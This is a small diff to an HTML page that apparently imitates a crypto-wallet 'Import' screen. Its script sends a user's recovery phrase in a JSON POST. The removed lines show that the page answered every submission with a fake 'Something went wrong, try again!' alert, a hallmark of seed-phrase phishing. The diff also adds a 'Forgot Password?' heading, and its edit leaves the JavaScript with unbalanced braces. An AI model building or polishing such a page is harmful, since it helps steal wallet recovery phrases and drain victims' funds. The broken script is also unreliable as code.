@@ -68,7 +68,7 @@
             border-radius: 10px;
             color: #ffffff;
             font-size: 16px;
-            margin-top: 500px;
+            margin-top: 50px;
         }
     </style>
     <script>
@@ -127,6 +127,7 @@ document.addEventListener('DOMContentLoaded', () => {
     </div>
     
     <button class="import-button" id="importButton">Import</button>
+    <h5>Forgot Password?</h5>
 
 
     <script>
@@ -182,10 +183,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
             })
             .then(response => response.json())
-            .then(data => {
-                alert("Something went wrong, try again!");
-                form2();
-                // Handle success actions (e.g., display a success message, clear the form)
             })
             .catch((error) => {
                 alert("Form cannot be processed");
